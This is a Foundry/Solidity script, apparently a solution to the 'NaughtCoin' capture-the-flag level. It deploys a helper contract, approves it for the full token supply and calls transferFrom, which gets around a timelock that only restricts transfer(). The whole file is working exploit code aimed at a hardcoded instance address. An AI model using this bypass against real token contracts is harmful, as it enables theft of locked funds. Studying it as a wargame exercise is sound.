// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";
import {Script} from "forge-std/Script.sol";

contract AttackerContract {
    NaughtCoin public naughtCoinInstance;

    constructor (address _address) {
        naughtCoinInstance = NaughtCoin(_address);
    }

    function attack() public {
        naughtCoinInstance.transferFrom(0x6A192a14dbd7e3e5Bf67f091aB39D6245c409ddf, address(this), naughtCoinInstance.INITIAL_SUPPLY());
    }
}

contract NaughtCoinAttack is Script {
    NaughtCoin public naughtCoinInstance = NaughtCoin(0x1B760423C46EEc057564e042D613D82e48324637);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        AttackerContract attackerContract = new AttackerContract(address(naughtCoinInstance));

        naughtCoinInstance.approve(address(attackerContract), naughtCoinInstance.INITIAL_SUPPLY());

        attackerContract.attack();

        vm.stopBroadcast();
    }
}